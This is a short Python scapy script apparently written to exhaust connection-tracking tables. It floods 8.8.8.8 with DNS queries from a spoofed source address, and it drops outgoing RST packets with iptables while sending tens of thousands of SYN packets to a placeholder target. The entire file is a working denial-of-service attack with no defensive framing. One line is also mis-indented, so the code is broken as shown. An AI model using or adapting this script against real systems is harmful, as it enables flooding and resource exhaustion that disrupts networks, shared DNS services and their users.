from scapy.all import *


# fill up dns table
for i in range(1<<16):
    send(IP(src="192.168.18.253", dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="tonkatsu.info")))
   time.sleep(0.1)


# fill up tcp table 
# execute following command before attack
# iptables -A OUTPUT -p tcp --tcp-flags RST RST -d xxx.xxx.xxx.xxx -j DROP
dest = "xxx.xxx.xxx.xxx"
os.system("iptables -L | grep RST || iptables -A OUTPUT -p tcp --tcp-flags RST RST -d {} -j DROP".format(dest))
for i in range(1<<16):
    send(IP(dst=dest)/TCP(sport=RandNum(1024, 65535), dport=80, flags='S'))
    time.sleep(0.1)
